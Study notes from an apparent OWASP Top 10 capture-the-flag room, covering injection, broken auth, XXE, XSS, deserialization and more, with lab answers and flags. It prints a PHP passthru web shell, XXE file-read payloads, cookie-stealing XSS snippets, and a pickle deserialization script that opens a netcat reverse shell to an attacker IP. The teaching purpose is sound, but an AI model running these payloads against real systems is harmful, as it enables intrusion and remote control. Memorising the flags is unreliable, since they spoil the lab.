# OWASP

* Injection
* Broken Authentication
* Sensitive Data Exposure
* XML External Entity
* Broken Access Control
* Security Misconfiguration
* Cross-site Scripting
* Insecure Deserialization
* Components with Known Vulnerabilities
* Insufficent Logging & Monitoring

## Injection

* User controlled input is interpreted as actual commands or parameters by the application.
* Injection attacks depend on what technologies are being used and how exactly the input is interpreted by these technologies.
* Common examples:
    * SQL Injection:This occurs when user controlled input is passed to SQL queries. As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries.
    * Command Injection: This occurs when user input is passed to system commands. As a result, an attacker is able to execute arbitrary system commands on application servers.
* The attacker (in this case) is able to:
    * Access, Modify and Delete information in a database (SQL injection). This would mean that an attacker can steal sensitive information.
    * Execute Arbitrary system commands on a server that would allow an attacker to gain access to users’ systems. This would enable them to steal sensitive data and carry out more attacks against infrastructure linked to the server on which the command is executed.
* To prevent injection attacks ensure that user controlled input is not interpreted as queries or commands. Some ways of doing this :
    * **Using an allow list**: when input is sent to the server, this input is compared to a list of safe input or characters. If the input is marked as safe, then it is processed. Otherwise, it is rejected and the application throws an error.
    * **Stripping input**: If the input contains dangerous characters, these characters are removed before they are processed.

## OS Command Injection

* Command Injection occurs when server-side code (like PHP) in a web application makes a system call on the hosting machine.
* Allows an attacker to take advantage of that made system call to execute OS commands on the server.
* Opens up many options for the attacker (spawn a reverse shell).
* A simple `nc -e /bin/bash` is all that's needed and they own your server (some variants netcat don't support -e option)
[List of Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

* **What is Active Command Injection?**
* Blind command injection occurs when the system command made to the server does not return the response to the user in the HTML document.
* Active command injection will return the response to the user.

**EvilShell (evilshell.php) Code Example**

```php
<?php

	if(isset($_GET['commandString'])){
		$command_string = $_GET['commandString'];
		try{
			passthru($command_string);
		}catch(Error $error){
			echo "<p class=mt-3><b>$error</b></p>";
		}
	}


?>
```

> **passthru** — Execute an external program and display raw output, ([more](https://www.php.net/manual/en/function.passthru.php))

Commands to try

* Linux:

    * whoami
    * id
    * ifconfig/ip addr
    * uname -a
    * ps -ef

---

1. What strange text file is in the website root directory?

```
drpepper.txt
```

2. How many non-root/non-service/non-daemon users are there?

```
0
```

3. What user is this app running as?

```
www-data
```

4. What is the user's shell set as?

```bash
grep "www-data" </etc/passwd | cut -f 7 -d ":"
/usr/sbin/nologin
```

5. What version of Ubuntu is running?

```bash
cat /etc/os-release
18.04.4
```

6. Print out the MOTD.  What favorite beverage is shown?

check the "drpepper.txt" text file
```
Dr Pepper
```

## Broken Auth

* Authentication and session management constitute core components of modern web applications.
* Authentication allows users to gain access to web applications by verifying their identities. 
* A session cookie is needed because web servers use HTTP(S) to communicate which is stateless.
* Attaching session cookies means that the server will know who is sending what data. The server can then keep track of users' actions. 
* Some common flaws in authentication mechanisms include:
   * **Brute force attacks**: If a web application uses usernames and passwords, an attacker is able to launch brute force attacks that allow them to guess the username and passwords using **multiple authentication attempts**.
   * **Use of weak credentials**: web applications should set strong password policies. If applications allow users to set passwords such as ‘password1’ or common passwords, then an attacker is able to easily guess them and access user accounts. They can do this without brute forcing and without multiple attempts.
   * **Weak Session Cookies**: Session cookies are how the server keeps track of users. If session cookies contain predictable values, an attacker can set their own session cookies and access users’ accounts. 

* There can be various mitigation for broken authentication mechanisms depending on the exact flaw:

   * To avoid **password guessing attacks**: ensure the application enforces a strong password policy. 
   * To avoid **brute force attacks**: ensure that the application enforces an automatic lockout after a certain number of attempts (prevent from launching more brute force attacks).
   * **Implement Multi Factor Authentication**: If a user has multiple methods of authentication(use username and passwords and receiving a code on their mobile device), then it would be difficult for an attacker to get access to both credentials to get access to their account.

---

1. What is the flag that you found in darren's account?

```
fe86079416a21a3c99937fea8874b667
```

2. Now try to do the same trick and see if you can login as arthur.

```
No Answer needed
```

3. What is the flag that you found in arthur's account?

```
d9ac0f7db4fda460ac3edeb75d75e16e
```

## Sensitive Data Exposure

* When a webapp accidentally divulges sensitive data, we refer to it as "**Sensitive Data Exposure**".
* This is often data directly linked to customers (names, financial information, ...), but could also be more technical information(usernames, passwords).
* At more complex levels this often involves techniques such as a "**Man in The Middle Attack**", whereby the attacker would force user connections through a device which they control, then take advantage of weak encryption on any transmitted data to gain access to the intercepted information (if the data is even encrypted in the first place...).
* Many examples are much simpler, and vulnerabilities can be found in web apps which can be exploited without any advanced networking knowledge( in some cases, the sensitive data can be found directly on the webserver itself...)
* The most common way to store a large amount of data in a format that is easily accessible from many locations at once is in a database.
* This is obviously perfect for something like a web application, as there may be many users interacting with the website at any one time.
* Database engines usually follow the Structured Query Language (SQL) syntax (MySQL or MariaDB).
* databases can also be stored as files referred to as "**flat-file**" databases, as they are stored as a single file on the computer.
* Usually this would not be a problem for a webapp, but what happens if the database is stored underneath the root directory of the website (i.e. one of the files that a user connecting to the website is able to access)? Well, we can download it and query it on our own machine, with full access to everything in the database. **Sensitive Data Exposure** indeed!
* Some of the syntax we would use to query a flat-file database:
   * The most common (and simplest) format of flat-file database is an *sqlite* database. These have a dedicated client for querying them on the command line ("**sqlite3**").

```
sqlite3 <database-name>: access an SQlite database.

.tables : see the tables in the database.
PRAGMA table_info(customers): to see the table information.
SELECT * FROM customers: to dump the information from the table.
```

### Hash crack:

* **Kali** comes pre-installed with various tools.
* Online tools such as [Crackstation](https://crackstation.net/) (*for weak hashes*)


---

1. What is the name of the mentioned directory?

```
/assets
```

2. Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?

```
webapp.db
```

3. Use the supporting material to access the sensitive data. What is the password hash of the admin user?

```
6eea9b7ef19179a06954edd0f6c05ceb
```

Crack the hash.
4. What is the admin's plaintext password?

```
qwertyuiop
```

5. Login as the admin. What is the flag?

```
THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}
```

## XML External Entity

* **XML External Entity (XXE)**:is a vulnerability that abuses features of XML parsers/data. 
* Often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system (can cause a DoS attack, perform a *Server-side requests Forgery **SSRF***, enable port scannig, lead RCE).

* Two types of XXE:

   * **In-band XXE**: the one in which the attacker can receive an immediate response to the XXE payload. 
   * **Out-band XXE (blind XXE)**: no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.

### What is XML?

XML (eXtensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. It is a markup language used for storing and transporting data. 

### Why we use XML?

1. XML is platform-independent and programming language independent, thus it can be used on any system and supports the technology change when that happens.

2. The data stored and transported using XML can be changed at any point in time without affecting the data presentation.

3. XML allows validation using DTD and Schema. This validation ensures that the XML document is free from any syntax error.

4. XML simplifies data sharing between various systems because of its platform-independent nature. XML data doesn’t require any conversion when transferred between different systems.

### Syntax

Every XML document mostly starts with what is known as XML Prolog.

```xml
<?xml version="1.0" encoding="UTF-8"?>
```

Above the line is called XML prolog and it specifies the XML version and the encoding used in the XML document. This line is not compulsory to use but it is considered a `good practice` to put that line in all your XML documents.

Every XML document must contain a `ROOT` element. For example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<mail>
   <to>falcon</to>
   <from>feast</from>
   <subject>About XXE</subject>
   <text>Teach about XXE</text>
</mail>
```

---

1. Full form of XML

```
Extensible Markup Language
```

2. Is it compulsory to have XML prolog in XML documents?

```
no
```
 
3. Can we validate XML documents against a schema?

```
yes
```
 
4. How can we specify XML version and encoding in XML document?

```
XML prolog
```

### DTD

* DTD: Document Type Definition
* A DTD defines the structure and the legal elements and attributes of an XML document.
* Example: The file `note.dtd` with the following content:

```xml
<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>
```

* we can use this DTD to validate the information of some XML document and make sure that the XML file conforms to the rules of that DTD.

* Ex: Below is given an XML document that uses note.dtd

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>falcon</to>
    <from>feast</from>
    <heading>hacking</heading>
    <body>XXE attack</body>
</note>
```

* Here's what all those terms used in `note.dtd` mean:

    * **!DOCTYPE note**: Defines a root element of the document named note
    * **!ELEMENT note**: Defines that the note element must contain the elements: "*to, from, heading, body*"
    * **!ELEMENT to**: Defines the *to* element to be of type "#PCDATA"
    * !ELEMENT from - Defines the *from* element to be of type "#PCDATA"
    * **!ELEMENT heading**: Defines the *heading* element to be of type "#PCDATA"
    * **!ELEMENT body**: Defines the *body* element to be of type "#PCDATA"

> **PCDATA**: Parseable Character Data

---

1. How do you define a new ELEMENT?

```
!ELEMENT
```

2. How do you define a ROOT element?

```
!DOCTYPE
```

3. How do you define a new ENTITY?

```
!ENTITY
```

### XXE Payload

1. The 1st payload we'll see is very simple. 

```xml
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>
```

As we can see we are defining a *ENTITY* called *name* and assigning it a value feast. Later we are using that *ENTITY* in our code.

2. We can also use XXE to read some file from the system by defining an *ENTITY* and having it use the *SYSTEM* keyword:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

Here again, we are defining an *ENTITY* with the name *read* but the difference is that we are setting it value to `SYSTEM` and path of the file.

* If we use this payload then a website vulnerable to **XXE**(normally) would display the content of the file */etc/passwd*.

* In a similar manner, we can use this kind of payload to read other files but a lot of times you can fail to read files in this manner or the reason for failure could be the file you are trying to read.

### Exploiting

```
export IP=10.10.44.213
```

---

using the 2 payload discused earlier we perform those tasks

1. What is the name of the user in /etc/passwd

```
falcon
```

2. Where is falcon's SSH key located?

```
/home/falcon/.ssh/id_rsa
```

3. What are the first 18 characters for falcon's private key

```
MIIEogIBAAKCAQEA7bq
```

## Broken Access Control

* Websites have pages that are protected from regular visitors
* A regular visitor being able to access protected pages, can lead to the following:

    * Being able to view sensitive information
    * Accessing unauthorized functionality

* **OWASP** have a listed a few attack scenarios demonstrating access control weaknesses:

    * **Scenario #1**: The application uses unverified data in a SQL call that is accessing account information:

    ```
    pstmt.setString(1, request.getParameter("acct"));
    ResultSet results = pstmt.executeQuery( );
    ```
    
    An attacker simply modifies the ‘acct’ parameter in the browser to send whatever account number they want. If not properly verified, the attacker can access any user’s account.
    http://example.com/app/accountInfo?acct=notmyacct

    * **Scenario #2**: An attacker simply force browses to target URLs. Admin rights are required for access to the admin page.
    http://example.com/app/getappInfo
    http://example.com/app/admin_getappInfo

 > If an unauthenticated non-admin user can access the admin page, this is a flaw.

### IDOR 

* **Insecure Direct Object Reference (IDOR)**: the act of exploiting a misconfiguration in the way user input is handled, to access resources you wouldn't ordinarily be able to access.
* IDOR is a type of access control vulnerability
* For example:
    * let's say we're logging into our bank account, and after correctly authenticating ourselves, we get taken to a URL like this *https://example.com/bank?account_number=1234*. On that page we can see all our important bank details, and a user would do whatever they needed to do and move along their way thinking nothing is wrong.

    * There is however a potentially huge problem here, a hacker may be able to change the *account_number* parameter to something else like *1235*, and if the site is incorrectly configured, then he would have access to someone else's bank information.

---

```
export IP=10.10.62.112
```

1. Look at other users notes. What is the flag?

```
flag{fivefourthree}
```

## Security Misconfiguration

* **Security Misconfigurations** are distinct from the other Top 10 vulnerabilities, because they occur when security could have been configured properly but was not.

* Security misconfigurations include:

    * Poorly configured permissions on cloud services, like S3 buckets
    * Having unnecessary features enabled, like services, pages, accounts or privileges
    * Default accounts with unchanged passwords
    * Error messages that are overly detailed and allow an attacker to find out more about the system
    * Not using HTTP security headers, or revealing too much detail in the Server: HTTP header

---

1. Hack into the webapp, and find the flag!

```
Search for: (github)
Pensive Notes
and look for credentiales in Readme.md
```

```
thm{4b9513968fd564a87b28aa1f9d672e17}
```

## Cross-Site Scripting

* **Cross-site scripting (XSS)**: a security vulnerability typically found in web applications. It’s a type of injection which can allow an attacker to execute malicious scripts and have it execute on a victim’s machine.

* A web application is vulnerable to **XSS** if it uses unsanitized user input. XSS is possible in Javascript, VBScript, Flash and CSS. There are three main types of cross-site scripting:

    * **Stored XSS**: the most dangerous type of XSS. This is where a malicious string originates from the website’s database. This often happens when a website allows user input that is not sanitised (remove the "bad parts" of a users input) when inserted into the database.
    * **Reflected XSS**:the malicious payload is part of the victims request to the website. The website includes this payload in response back to the user. To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.
    * **DOM-Based XSS**: *DOM* stands for *Document Object Model* and is a programming interface for *HTML* and *XML* documents. It represents the page so that programs can change the document structure, style and content. A web page is a document and this document can be either displayed in the browser window or as the *HTML* source.

### **XSS Payloads**: 

> Remember, XSS is a vulnerability that can be exploited to execute malicious *Javascript* on a victim’s machine. Check out some common payloads types used:

* **Popup's (<script>alert(“Hello World”)</script>)**: Creates a Hello World message popup on a users browser.
* **Writing HTML(document.write)**: Override the website's HTML to add your own (essentially defacing the entire page).
* **XSS Keylogger** [XSS Payloads](http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html): You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.
* **Port scanning** [XSS Payloads](http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html): A mini local port scanner.

> [XSS-Payloads.com](http://www.xss-payloads.com/) is a website that has **XSS** related *Payloads, Tools, Documentation* and more. You can download **XSS payloads** that take snapshots from a webcam or even get a more capable port and network scanner.

---

1. Navigate to http://10.10.109.148/ in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".

```html
<script> alert('Hello') </script>
```

```
ThereIsMoreToXSSThanYouThink
```

2. On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.

```js
alert(window.location.host)
```

```
ReflectiveXss4TheWin
```

3. Now navigate to http://10.10.109.148/ in your browser and click on the "Stored XSS" tab on the navbar; make an account.
Then add a comment and see if you can insert some of your own HTML.

```
HTML_T4gs
```

4. On the same page, create an alert popup box appear on the page with your document cookies.

```js
alert(document.cookies)
```

```
W3LL_D0N3_LVL2s
```

5. Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.

```js
document.querySelector("#thm-title").textContent = "I am a hacker"
```

```
 websites_can_be_easily_defaced_with_xss
```

## Insecure Deserialization

* "**Insecure Deserialization** is a vulnerability which occurs when untrusted data is used to abuse the logic of an application" *(Acunetix., 2017)*
* **Insecure Deserialization**: replacing data processed by an application with malicious code; allowing anything (from DoS to RCE).
* Specifically, this malicious code leverages the legitimate **serialization** and **deserialization** process used by web applications.
* OWASP rank this vulnerability as 8 out of 10 because of the following reasons:
    1. **Low exploitability**: it's often a case-by-case basis - there is no reliable tool/framework for it. Because of its nature, attackers need to have a *good understanding* of the inner-workings of the ToE.

    2. **Only as dangerous** as the attacker's **skill** permits, more so, the value of the data that is exposed.

### What's Vulnerable?

* At summary, ultimately, any application that stores or fetches data where there are no validations or integrity checks in place for the data queried or retained. A few examples of applications of this nature are:

    1. E-Commerce Sites
    2. Forums
    3. API's
    4. Application Runtimes (Tomcat, Jenkins, Jboss, etc)

---

1. Who developed the Tomcat application?

```
The Apache Software Foundation
```

2. What type of attack that crashes services can be performed with insecure deserialization?

```
Denial of service
```

## Objects

* A prominent element of **object-oriented programming (OOP)**, objects are made up of two things:
    1. **State**
    2. **Behaviour**

* Simply, objects allow you to create similar lines of code without having to do the leg-work of writing the same lines of code again.

* For example, a **lamp** would be a good object. Lamps can have different types of *bulbs*, this would be their *state*, as well as being either *on/off* - their *behaviour*!
* Rather than having to accommodate every type of bulb and whether or not that specific lamp is on or off, you can use **methods** to simply alter the state and behaviour of the lamp.

---

1. Select the correct term of the following statement:


if a dog was sleeping, would this be:

A) A State
B) A Behaviour 

```
A Behaviour
```

### De(Serialization)

* **Serialisation** is the process of converting objects used in programming into simpler, compatible formatting for *transmitting* between systems or networks for *further processing or storage*.

* Alternatively, **Deserialisation** is the reverse of this; converting *serialised* information into their complex form - an object that the application will understand.

* Example:

```
Say you have a password of "password123" from a program that needs to be stored in a database on another system. To travel across a network this string/output needs to be converted to binary. Of course, the password needs to be stored as "password123" and not its binary notation. Once this reaches the database, it is converted or deserialised back into "password123" so it can be stored.
```

* **Insecure Deserialization** occurs when data from an untrusted party (I.e. a hacker) gets **executed** because there is *no filtering* or *input validation*; the system assumes that the data is *trustworthy* and will *execute* it no holds barred.

---

1. What is the name of the base-2 formatting that data is sent across a network as? 

```
Binary
```

### Cookies

* **Cookies** are an essential tool for modern websites to function. Tiny pieces of data, these are created by a website and stored on the user's computer. 

* **Cookies** are not permanent storage solutions like databases. Some **cookies** such as **session ID**'s will clear when the browser is closed, others, however, last considerably longer. This is determined by the "*Expiry*" timer that is set when the cookie is created.

* Some cookies have additional attributes, a small list of these are below:

|Attribute|Description|Required|
|---|---|---|
|Cookie Name|The Name of the Cookie to be set|Yes|
|Cookie Value|Value, this can be anything plaintext or encoded|Yes|
|Secure Only|If set, this cookie will only be set over HTTPS connections|No|
|Expiry|Set a timestamp where the cookie will be removed from the browser|No|
|Path|The cookie will only be sent if the specified URL is within the request|No|

* **Creating Cookies**:

Cookies can be set in various website programming languages. For example, Javascript, PHP or Python to name a few. The following web application is developed using Python's Flask, so it is fitting to use it as an example.

```python
dateTime = datetime.now()
timestamp = str(dateTime)
resp.set_cookie("registration_cookie", timestamp)
```
Simply, this snippet gets the current date and time, stores it within the variable "*timestamp*" and then stores the date and time in a cookie named "registrationT_cookie". This is what it will look like in the browser:

```
|registration_cookie|@IP|/path|Session|Mon,16 Aug 2021...|2021-08-16 14:39:52.015677|
|---|---|---|---|---|---|
```

---

1. If a cookie had the path of webapp.com/login , what would the URL that the user has to visit be?

```
webapp.com/login
```

2. What is the acronym for the web technology that Secure cookies work over?

```
HTTPS
```

---
* **Cookie practical**: 

1. 1st flag (cookie value)

```
THM{good_old_base64_huh}
```

2. 2nd flag (admin dashboard), change the userType to admin

```
THM{heres_the_admin_flag} 
```

---
* **Code Execution**: 

* snippet code:

```py
# Serialize
cookie = {"replaceme": payload}

pickle_payload = pickle.dump(cookie)# Serialize the cookie
encPayloadCookie = base64.b64encode(pickle_payload)

resp = make_response(redirect("/myprofile"))
resp.set_cookie("encodedPayload", encPayloadCookie)
```

```py
# Deserialize
cookie = request.cookies.get("encodedPayload")

cookie = pickle.loads(cookie)# Deserialize the cookie
```

> This vulnerability exploits Python Pickle

---
* **The Exploit**: 

* Set up a netcat listener

```bash
nc -lnvp 9999
```
Because the code being deserialized is from a base64 format, we cannot just simply spawn a reverse shell. We must encode our own commands in base64 so that the malicious code will be executed

* create a .py file and paste this code into 

> change the `@IP` with your own host IP, and `port` with the port used with the listener

```py
import pickle
import sys
import base64

command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat @IP port > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
```

* Execute "rce.py" via `python3 rce.py`. Note the output of the command, it will look something similar to this:

```
gASVcgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFdybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCBuZXRjYXQgMTAuNi41OC45IDk5OTkgPiAvdG1wL2aUhZRSlC4=
```

* Copy and paste everything in-between the two speech marks ('DATA').Paste this into the "encodedPayload" cookie in your browser
* Ensure our netcat listener is still running. Refresh the page. It will hang, refer back to your netcat listener, and boom you've a remote shell

1. flag.txt

```
4a69a7ff9fd68
```

## Components With Known Vulnerabilities

Occasionally, you may find that the company/entity that you're pen-testing is using a program that already has a well documented vulnerability.

For example, let's say that a company hasn't updated their version of WordPress for a few years, and using a tool such as wpscan, you find that it's version 4.6. Some quick research will reveal that WordPress 4.6 is vulnerable to an unauthenticated remote code execution(RCE) exploit, and even better you can find an exploit already made on [exploit-db](https://www.exploit-db.com/).

As you can see this would be quite devastating, because it requires very little work on the part of the attacker as often times since the vulnerability is already well known, someone else has made an exploit for the vulnerability. The situation becomes even worse when you realize, that it's really quite easy for this to happen, if a company misses a single update for a program they use, they could be vulnerable to any number of attacks.

Hence, why OWASP has rated this a 3(meaning high) on the prevalence scale, it is incredibly easy for a company to miss an update for an application.

---

1. How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)

> Hint1: look for `unauth book store app's rce` and you'll find the exploit, run the code and specify the url, then enter what command you want to run within the server

> Hint2: use `wc -c /etc/passwd` to get the answer

```
1611
```

## Insufficient Logging and Monitoring

* When web applications are set up, every action performed by the user should be logged. 
* Logging is important because in the event of an incident, the attackers actions can be traced. Once their actions are traced, their risk and impact can be determined.
* Without logging, there would be no way to tell what actions an attacker performed if they gain access to particular web applications.
* The bigger impacts of these include:

    * **regulatory damage**: if an attacker has gained access to personally identifiable user information and there is no record of this, not only are users of the application affected, but the application owners may be subject to fines or more severe actions depending on regulations.
    * **risk of further attacks**: without logging, the presence of an attacker may be undetected. This could allow an attacker to launch further attacks against web application owners by stealing credentials, attacking infrastructure and more.

* The information stored in logs should include:

    * **HTTP status codes**
    * **Time Stamps**
    * **Usernames**
    * **API endpoints/page locations**
    * **IP addresses**

* These logs do have some *sensitive information* on them so its important to ensure that logs are stored *securely* and *multiple copies* of these logs are stored at *different* locations.

* As you may have noticed, logging is more important after a breach or incident has occurred. The ideal case is having monitoring in place to detect any suspicious activity. The aim of detecting this suspicious activity is to either stop the attacker completely or reduce the impact they've made if their presence has been detected much later than anticipated.
* Common examples of suspicious activity includes:

    * multiple unauthorised attempts for a particular action (usually authentication attempts or access to unauthorised resources e.g. admin pages)
    * requests from anomalous IP addresses or locations: while this can indicate that someone else is trying to access a particular user's account, it can also have a false positive rate.
    * use of automated tools: particular automated tooling can be easily identifiable e.g. using the value of User-Agent headers or the speed of requests. This can indicate an attacker is using automated tooling.
    * common payloads: in web applications, it's common for attackers to use Cross Site Scripting (XSS) payloads. Detecting the use of these payloads can indicate the presence of someone conducting unauthorised/malicious testing on applications.

---


1. What IP address is the attacker using?

```
49.99.13.16
```

2. What kind of attack is being carried out?

```
Brute Force
```
